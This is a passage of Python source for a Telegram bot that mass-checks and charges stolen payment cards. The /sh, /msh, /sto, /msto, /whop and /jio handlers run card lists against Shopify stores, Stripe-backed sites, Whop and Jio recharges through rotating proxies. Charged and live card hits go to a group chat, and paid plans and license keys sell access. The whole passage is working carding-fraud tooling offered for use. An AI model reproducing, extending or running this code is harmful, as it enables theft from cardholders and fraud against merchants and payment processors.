            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙽𝚘𝚝 𝚂𝚎𝚝</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗦𝗲𝘁</b> ⌁ <code>/setproxy ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗔𝘂𝘁𝗵</b> ⌁ <code>/setproxy ip:port:user:pass</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        ), parse_mode='html'); return
    if not cards:
        await event.respond(premium_emoji("No cards."), parse_mode='html'); return

    workers = get_worker_count(uid)
    stop_kb = [[Button.inline("🛑 STOP", b"stop_mass", style="danger")]]
    sm = await event.respond(premium_emoji(
        f'[⌯] <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards)}\n'
        f'[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan}\n'
        f'[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {workers}\n'
        f'[⌯] 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ⌁ 0/{len(cards)}\n\n'
        f'<b>Checking started...</b>'
    ), parse_mode='html', buttons=stop_kb)

    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'paused': False}

    ar = {'charged': [], 'approved': [], 'dead': [], 'error': [], 'total': len(cards), 'checked': 0}
    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)

    lu = [time.time()]
    checker_name = await get_checker_mention(uid)
    start_time = time.time()

    async def worker():
        while not q.empty():
            if session_key not in active_sessions: break
            try: c = q.get_nowait()
            except: break
            try:
                r = await check_card_with_retry(c, sites, proxies, max_retries=1)
            except Exception as e:
                logging.warning(f"Worker: {e}")
                ar['checked'] += 1
                continue
            ar['checked'] += 1
            gw = r.get('gateway','Shopify Payments')
            pr = r.get('price','0.98')

            if r['status'] == 'Charged':
                ar['charged'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Charged', pr)
                await send_check_result(uid, r['card'], 'Charged', r['message'], gw, pr, 0.0, checker_name)
            elif r['status'] == 'Approved':
                ar['approved'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Approved', pr)
                await send_check_result(uid, r['card'], 'Approved', r['message'], gw, pr, 0.0, checker_name)
            elif r['status'] == 'Site Error':
                ar['error'].append(r)
            else:
                ar['dead'].append(r)

            now = time.time()
            if now - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                lu[0] = now
                try:
                    progress = (
                        f'[⌯] <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
                        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
                        f'[⌯] 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ⌁ {ar["checked"]}/{ar["total"]}\n\n'
                        f'[⌯] ✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {len(ar["charged"])}\n'
                        f'[⌯] 🔥 𝗟𝗶𝘃𝗲 ⌁ {len(ar["approved"])}\n'
                        f'[⌯] ❌ 𝗗𝗲𝗮𝗱 ⌁ {len(ar["dead"])}'
                    )
                    await sm.edit(premium_emoji(progress), parse_mode='html')
                except: pass

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws, return_exceptions=True)

    if session_key in active_sessions: del active_sessions[session_key]
    try: await sm.delete()
    except: pass

    elapsed = time.time() - start_time
    mins, secs = divmod(int(elapsed), 60)
    time_str = f"{mins:02d}:{secs:02d}"

    hits = ""
    for r in ar['charged'][:5]: hits += f'✅ <code>{r["card"]}</code>\n'
    for r in ar['approved'][:5]: hits += f'🔥 <code>{r["card"]}</code>\n'
    if not hits: hits = "No hits"

    final = (
        f'[⌯] <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀</b> ⌁ <b>𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 📊 𝗧𝗼𝘁𝗮𝗹 ⌁ {ar["total"]}\n'
        f'[⌯] ⏱️ 𝗧𝗶𝗺𝗲 ⌁ {time_str}\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] ✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {len(ar["charged"])}\n'
        f'[⌯] 🔥 𝗟𝗶𝘃𝗲 ⌁ {len(ar["approved"])}\n'
        f'[⌯] ❌ 𝗗𝗲𝗮𝗱 ⌁ {len(ar["dead"])}\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 𝗛𝗶𝘁𝘀:\n{hits}'
    )
    await event.respond(premium_emoji(final), parse_mode='html')

    # Result TXT
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"chk_result_{uid}_{ts}.txt"
    async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
        await f.write("="*70 + "\n⚡ SHOPIFY MASS CHECK\n" + "="*70 + "\n\n")
        await f.write(f"Total: {ar['total']}\nCharged: {len(ar['charged'])}\nLive: {len(ar['approved'])}\nDead: {len(ar['dead'])}\n\n")
        await f.write("="*70 + "\n✅ CHARGED\n" + "="*70 + "\n")
        for r in ar['charged']: await f.write(f"{r['card']} | {r['message'][:80]}\n")
        await f.write("\n" + "="*70 + "\n🔥 APPROVED\n" + "="*70 + "\n")
        for r in ar['approved']: await f.write(f"{r['card']} | {r['message'][:80]}\n")
        await f.write("\n" + "="*70 + "\n❌ DEAD\n" + "="*70 + "\n")
        for r in ar['dead']: await f.write(f"{r['card']} | {r['message'][:80]}\n")
    try:
        await bot.send_message(uid, premium_emoji("📁 <b>Full Report</b>"), file=fn, parse_mode='html')
    except: pass
    try: os.remove(fn)
    except: pass

# ============================================================
#  /sh SHOPIFY
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def sh_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
    card = cards[0]
    pending_price_range[uid] = {'action': 'sh', 'cc': card}
    await event.reply(
        premium_emoji(
            f'[⌯] <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <b>𝗖𝗖</b> ⌁ <code>{card}</code>\n\n'
            f'<b>Select Price Range:</b>'
        ),
        buttons=get_price_range_keyboard('sh'),
        parse_mode='html'
    )

# ============================================================
#  /msh SHOPIFY MASS
# ============================================================
@bot.on(events.NewMessage(pattern='/msh'))
async def msh_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if not event.reply_to_msg_id: await event.reply(premium_emoji("Reply to a .txt file."), parse_mode='html'); return
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'):
        await event.reply(premium_emoji("Reply to a .txt file."), parse_mode='html'); return
    fp = await rm.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    cards = extract_cc(content)
    try: os.remove(fp)
    except: pass
    if not cards: await event.reply(premium_emoji("No valid cards."), parse_mode='html'); return
    mass_limit = get_mass_limit(uid)
    if mass_limit == 0:
        await event.reply(premium_emoji(f"❌ Your plan ({get_user_plan(uid)}) does not support Mass Check."), parse_mode='html'); return
    if len(cards) > mass_limit: cards = cards[:mass_limit]
    pending_price_range[uid] = {'action': 'msh', 'cards': cards}
    await event.reply(
        premium_emoji(
            f'[⌯] <b>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
            f'[⌯] <b>Total CC</b> ⌁ {len(cards)}\n\n'
            f'<b>Select Price Range:</b>'
        ),
        buttons=get_price_range_keyboard('msh'),
        parse_mode='html'
    )

# ============================================================
#  /sto STRIPE HITTER
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/sto\s+'))
async def sto_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    if not HITTER_AVAILABLE:
        await event.reply(premium_emoji("❌ Stripe Hitter not available. hitter.py missing."), parse_mode='html'); return
    parts = event.message.text.split(' ', 2)
    if len(parts) < 3: await event.reply(premium_emoji("❌ <code>/sto URL CC</code>"), parse_mode='html'); return
    url = parts[1].strip(); cc_input = parts[2].strip()
    cards = extract_cc(cc_input)
    if not cards:
        if len(cc_input.split('|')) == 4: cards = [cc_input]
        else: await event.reply(premium_emoji("❌ Invalid CC"), parse_mode='html'); return
    card = cards[0]

    proxies = get_proxies_for_check(uid, "hitter") or get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji(
            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙽𝚘𝚝 𝚂𝚎𝚝</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗦𝗲𝘁</b> ⌁ <code>/setproxy ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        ), parse_mode='html'); return
    proxy = random.choice(proxies)

    sm = await event.reply(premium_emoji(f"⚡ <b>Stripe Hitter...</b>\n\n{card}"), parse_mode='html')
    start_time = time.time()
    try:
        checker = AsyncStripeChecker(url, proxy)
        if not await checker.prefetch():
            await checker.close()
            await sm.edit(premium_emoji("❌ <b>Prefetch failed</b>"), parse_mode='html'); return
        p = card.split('|')
        cd = {"cc": p[0], "month": p[1], "year": p[2][-2:], "cvv": p[3], "full": card}
        result = await checker.charge_card(cd)
        await checker.close()
        elapsed = time.time() - start_time
        checker_name = await get_checker_mention(uid)
        amount = checker.amount_str
        st = result.get('status', 'ERROR'); msg = result.get('message', '')

        if st == 'CHARGED':
            await send_hit_to_group(uid, card, msg, "Stripe Hitter", "Charged", amount)
            await send_check_result(uid, card, 'Charged', msg, "Stripe Hitter", amount, elapsed, checker_name)
        elif st == 'LIVE':
            await send_hit_to_group(uid, card, msg, "Stripe Hitter", "Approved", amount)
            await send_check_result(uid, card, 'Approved', msg, "Stripe Hitter", amount, elapsed, checker_name)
        elif st == '3DS':
            await send_check_result(uid, card, 'Approved', "3DS Required", "Stripe Hitter", amount, elapsed, checker_name)
        elif st == 'HCAPTCHA':
            await sm.edit(premium_emoji(f"🤖 <b>Hcaptcha Required</b>\n\n{card}"), parse_mode='html')
        else:
            await send_check_result(uid, card, 'Dead', msg or st, "Stripe Hitter", amount, elapsed, checker_name)
        try: await sm.delete()
        except: pass
    except Exception as e:
        try:
            await send_check_result(uid, card, 'Error', str(e)[:80], "Stripe Hitter", "-", time.time()-start_time, await get_checker_mention(uid))
            try: await sm.delete()
            except: pass
        except:
            await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ============================================================
#  /msto STRIPE HITTER MASS
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/msto\s+'))
async def msto_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if not HITTER_AVAILABLE:
        await event.reply(premium_emoji("❌ Not available."), parse_mode='html'); return
    parts = event.message.text.split(' ', 1)
    if len(parts) < 2: await event.reply(premium_emoji("❌ <code>/msto URL</code>"), parse_mode='html'); return
    url = parts[1].strip()
    if not event.reply_to_msg_id: await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    rm = await event.get_reply_message()
    if not rm.file or not rm.file.name.endswith('.txt'):
        await event.reply(premium_emoji("Reply to .txt"), parse_mode='html'); return
    fp = await rm.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    cards = extract_cc(content)
    try: os.remove(fp)
    except: pass
    if not cards: await event.reply(premium_emoji("No valid cards."), parse_mode='html'); return
    mass_limit = get_mass_limit(uid)
    if mass_limit == 0:
        await event.reply(premium_emoji(f"❌ Your plan doesn't support Mass Check."), parse_mode='html'); return
    if len(cards) > mass_limit: cards = cards[:mass_limit]
    proxies = get_proxies_for_check(uid, "hitter") or get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ Set proxy first with /setproxy"), parse_mode='html'); return
    proxy = random.choice(proxies)
    workers = max(1, min(30, len(proxies) * 3))
    stop_kb = [[Button.inline("🛑 STOP", b"stop_mass", style="danger")]]
    sm = await event.respond(premium_emoji(
        f'[⌯] <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝗛𝗶𝘁𝘁𝗲𝗿 𝗠𝗮𝘀𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] Total ⌁ {len(cards)}\n'
        f'[⌯] Workers ⌁ {workers}\n'
        f'[⌯] Progress ⌁ 0/{len(cards)}'
    ), parse_mode='html', buttons=stop_kb)
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'paused': False}
    ar = {'charged': [], 'live': [], 'dead': [], 'error': [], 'total': len(cards), 'checked': 0}
    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)
    lu = [time.time()]
    checker_name = await get_checker_mention(uid)
    start_time = time.time()
    async def worker():
        checker = None
        try:
            checker = AsyncStripeChecker(url, proxy)
            if not await checker.prefetch():
                await checker.close(); return
            while not q.empty():
                if session_key not in active_sessions: break
                try: c = q.get_nowait()
                except: break
                try:
                    p = c.split('|')
                    cd = {"cc": p[0], "month": p[1], "year": p[2][-2:], "cvv": p[3], "full": c}
                    r = await checker.charge_card(cd)
                except: ar['checked'] += 1; continue
                ar['checked'] += 1
                st = r.get('status', 'ERROR'); msg = r.get('message', '')
                amount = checker.amount_str
                if st == 'CHARGED':
                    ar['charged'].append(r)
                    await send_hit_to_group(uid, c, msg, "Stripe Hitter", "Charged", amount)
                    await send_check_result(uid, c, 'Charged', msg, "Stripe Hitter", amount, 0.0, checker_name)
                elif st == 'LIVE':
                    ar['live'].append(r)
                    await send_hit_to_group(uid, c, msg, "Stripe Hitter", "Approved", amount)
                    await send_check_result(uid, c, 'Approved', msg, "Stripe Hitter", amount, 0.0, checker_name)
                elif st in ('3DS', 'HCAPTCHA'): ar['live'].append(r)
                elif st == 'DECLINED': ar['dead'].append(r)
                else: ar['error'].append(r)
                now = time.time()
                if now - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                    lu[0] = now
                    try:
                        prog = (
                            f'[⌯] <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝗛𝗶𝘁𝘁𝗲𝗿 𝗠𝗮𝘀𝘀</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
                            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
                            f'[⌯] Progress ⌁ {ar["checked"]}/{ar["total"]}\n\n'
                            f'[⌯] ✅ Charged ⌁ {len(ar["charged"])}\n'
                            f'[⌯] 🔥 Live ⌁ {len(ar["live"])}\n'
                            f'[⌯] ❌ Dead ⌁ {len(ar["dead"])}'
                        )
                        await sm.edit(premium_emoji(prog), parse_mode='html')
                    except: pass
        finally:
            if checker: await checker.close()
    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws, return_exceptions=True)
    if session_key in active_sessions: del active_sessions[session_key]
    try: await sm.delete()
    except: pass
    elapsed = time.time() - start_time
    mins, secs = divmod(int(elapsed), 60)
    time_str = f"{mins:02d}:{secs:02d}"
    hits = ""
    for r in ar['charged'][:5]: hits += f'✅ <code>{r["card"]}</code>\n'
    for r in ar['live'][:5]: hits += f'🔥 <code>{r["card"]}</code>\n'
    if not hits: hits = "No hits"
    await event.respond(premium_emoji(
        f'[⌯] <b>𝗦𝘁𝗿𝗶𝗽𝗲 𝗛𝗶𝘁𝘁𝗲𝗿 𝗠𝗮𝘀𝘀</b> ⌁ <b>𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 📊 Total ⌁ {ar["total"]}\n'
        f'[⌯] ⏱️ Time ⌁ {time_str}\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] ✅ Charged ⌁ {len(ar["charged"])}\n'
        f'[⌯] 🔥 Live ⌁ {len(ar["live"])}\n'
        f'[⌯] ❌ Dead ⌁ {len(ar["dead"])}\n\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n\n'
        f'[⌯] 𝗛𝗶𝘁𝘀:\n{hits}'
    ), parse_mode='html')

# ============================================================
#  /whop
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/whop\s+'))
async def whop_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    parts = event.message.text.split(' ', 2)
    if len(parts) < 3: await event.reply(premium_emoji("❌ <code>/whop URL CC</code>"), parse_mode='html'); return
    url = parts[1].strip(); cc_input = parts[2].strip()
    cards = extract_cc(cc_input)
    if not cards:
        if len(cc_input.split('|')) == 4: cards = [cc_input]
        else: await event.reply(premium_emoji("❌ Invalid CC"), parse_mode='html'); return
    card = cards[0]
    proxies = get_proxies_for_check(uid, "whop") or get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ Set proxy first with /setproxy"), parse_mode='html'); return
    proxy = random.choice(proxies)
    sm = await event.reply(premium_emoji(f"⚡ <b>Whop Checking...</b>\n\n{card}\nWait 30-90s..."), parse_mode='html')
    start_time = time.time()
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, run_whop_check, url, card, "", proxy)
        elapsed = time.time() - start_time
        st = result.get('status', 'unknown'); msg = result.get('message', '')
        checker_name = await get_checker_mention(uid)
        if st == 'charged':
            await send_hit_to_group(uid, card, msg or "Charged", "Whop", "Charged", "-")
            await send_check_result(uid, card, 'Charged', msg or "Charged", "Whop", "-", elapsed, checker_name)
        elif st == '3ds':
            await send_hit_to_group(uid, card, "3DS", "Whop", "Approved", "-")
            await send_check_result(uid, card, 'Approved', "3DS", "Whop", "-", elapsed, checker_name)
        else:
            await send_check_result(uid, card, 'Dead', msg or st, "Whop", "-", elapsed, checker_name)
        try: await sm.delete()
        except: pass
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ============================================================
#  /jio
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/jio\s+'))
async def jio_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 4:
        await event.reply(premium_emoji("❌ <code>/jio &lt;number&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>"), parse_mode='html'); return
    number = parts[1]; amount = parts[2]; cc = parts[3]
    proxies = get_proxies_for_check(uid, "hitter") or get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ Set proxy first with /setproxy"), parse_mode='html'); return
    proxy = random.choice(proxies)
    sm = await event.reply(premium_emoji(f"⚡ <b>Jio Recharge...</b>\n\nNumber: {number}\nAmount: Rs {amount}\nCC: {cc}\nProxy: <code>{proxy[:40]}</code>"), parse_mode='html')
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, _jio_run_with_retry, number, amount, cc, proxy, 2)
        st = result.get('status', 'error'); msg = result.get('message', '')
        checker_name = await get_checker_mention(uid)
        if st == 'charged':
            await send_hit_to_group(uid, cc, f"Recharge Successful Rs{amount}", "Jio", "Charged", amount)
            await send_check_result(uid, cc, 'Charged', f"Recharge Successful Rs{amount}", "Jio", amount, 0.0, checker_name)
            await sm.edit(premium_emoji(f"✅ <b>Jio Charged!</b>\n\nNumber: {number}\nAmount: Rs {amount}"), parse_mode='html')
        else:
            await send_check_result(uid, cc, 'Dead', msg, "Jio", amount, 0.0, checker_name)
            await sm.edit(premium_emoji(f"❌ <b>{st}</b>\n\n{msg[:100]}"), parse_mode='html')
    except Exception as e:
        await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ============================================================
#  /setproxy /myproxy /clearproxy
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/setproxy\s+'))
async def setproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji(
            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙽𝚘𝚝 𝚂𝚎𝚝</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗦𝗲𝘁</b> ⌁ <code>/setproxy ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗔𝘂𝘁𝗵</b> ⌁ <code>/setproxy ip:port:user:pass</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'[⌯] <b>𝗦𝗢𝗖𝗞𝗦𝟱</b> ⌁ <code>/setproxy socks5://user:pass@ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        ), parse_mode='html'); return
    proxy_str = args[1].strip()
    valid = False
    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"): valid = True
    elif proxy_str.count(':') == 1: valid = True
    elif proxy_str.count(':') == 3: valid = True
    if not valid:
        await event.reply(premium_emoji("❌ Invalid proxy format."), parse_mode='html'); return
    testing_msg = await event.reply(premium_emoji(
        f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 𝗧𝗲𝘀𝘁𝗶𝗻𝗴</b> ⌁ <tg-emoji emoji-id="{E["⏳"]}">⏳</tg-emoji>\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] Testing proxy connection...'
    ), parse_mode='html')
    loop = asyncio.get_event_loop()
    ok, country, ip = await loop.run_in_executor(None, test_proxy_connection, proxy_str)
    if not ok:
        await testing_msg.edit(premium_emoji(
            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝗗𝗲𝗮𝗱</b> ⌁ <tg-emoji emoji-id="{E["❌"]}">❌</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗥𝗲𝘀𝘂𝗹𝘁</b> ⌁ <b>𝙵𝚊𝚒𝚕𝚎𝚍</b> ⌁ <tg-emoji emoji-id="{E["❌"]}">❌</tg-emoji>\n'
            f'[⌯] <b>𝗥𝗲𝗮𝘀𝗼𝗻</b> ⌁ <b>𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗 𝚝𝚒𝚖𝚎𝚘𝚞𝚝</b>'
        ), parse_mode='html'); return
    proxies_list = load_user_proxies(uid, "shopify")
    added = 0
    if proxy_str not in proxies_list:
        proxies_list.append(proxy_str); added = 1
        save_user_proxies(uid, proxies_list, "shopify")
    total = len(proxies_list)
    workers = max(1, min(30, total * 3))
    await testing_msg.edit(premium_emoji(
        f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 𝗦𝗮𝘃𝗲𝗱 ⌁ 𝙳𝚘𝚗𝚎</b> ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗔𝗱𝗱𝗲𝗱</b> ⌁ <b>{added}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗧𝗼𝘁𝗮𝗹</b> ⌁ <b>{total}/30</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗪𝗼𝗿𝗸𝗲𝗿𝘀</b> ⌁ <b>{workers} 𝚘𝚗 {total} 𝚙𝚛𝚘𝚡𝚒𝚎𝚜</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆</b> ⌁ <b>{country}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy\b'))
async def myproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji(
            f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙽𝚘𝚝 𝚂𝚎𝚝</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'[⌯] <b>𝗦𝗲𝘁</b> ⌁ <code>/setproxy ip:port</code> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>'
        ), parse_mode='html'); return
    total = len(proxies)
    workers = max(1, min(30, total * 3))
    list_txt = "\n".join([f'{i+1}. <code>{p[:50]}</code>' for i, p in enumerate(proxies[:10])])
    await event.reply(premium_emoji(
        f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 ⌁ 𝗦𝗲𝘁</b> ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗧𝗼𝘁𝗮𝗹</b> ⌁ <b>{total}/30</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n'
        f'[⌯] <b>𝗪𝗼𝗿𝗸𝗲𝗿𝘀</b> ⌁ <b>{workers}</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
        f'{list_txt}'
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy\b'))
async def clearproxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    save_user_proxies(uid, [], "shopify")
    save_user_proxies(uid, [], "whop")
    save_user_proxies(uid, [], "hitter")
    await event.reply(premium_emoji(
        f'[⌯] <b>𝗣𝗿𝗼𝘅𝘆 𝗖𝗹𝗲𝗮𝗿𝗲𝗱</b> ⌁ <tg-emoji emoji-id="{E["✅"]}">✅</tg-emoji>\n'
        f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
        f'[⌯] <b>𝗦𝘁𝗮𝘁𝘂𝘀</b> ⌁ <b>𝙰𝚕𝚕 𝚙𝚛𝚘𝚡𝚒𝚎𝚜 𝚛𝚎𝚖𝚘𝚟𝚎𝚍</b>'
    ), parse_mode='html')

# ============================================================
#  /key
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/key\s+'))
async def key_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 3:
        await event.reply(premium_emoji("❌ <code>/key days plan</code>\n\nExample: <code>/key 30 Pro</code>\n\nPlans: Free, Sed, Pro, Bot Op, TeamMate, Admin, Owner"), parse_mode='html'); return
    try: days = int(a[1])
    except: await event.reply(premium_emoji("❌ Days must be number."), parse_mode='html'); return
    plan = " ".join(a[2:]).strip()
    if plan not in VALID_PLANS:
        await event.reply(premium_emoji(f"❌ Invalid plan. Use: {', '.join(VALID_PLANS)}"), parse_mode='html'); return
    kd = load_json_file(KEYS_FILE, {})
    key = "BARK-" + generate_key(12)
    while key in kd: key = "BARK-" + generate_key(12)
    kd[key] = {'plan': plan, 'days': days, 'created_by': event.sender_id,
               'created_at': datetime.now().isoformat(), 'used_by': None, 'max_uses': 40, 'used_count': 0}
    save_json_file(KEYS_FILE, kd)
    admin_name = await get_checker_mention(event.sender_id)
    txt = (
        f'[⌯] <b>𝗞𝗲𝘆 ⌁ 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎𝚍</b> ⌁ <tg-emoji emoji-id="{E["⚡"]}">⚡</tg-emoji>\n\n'
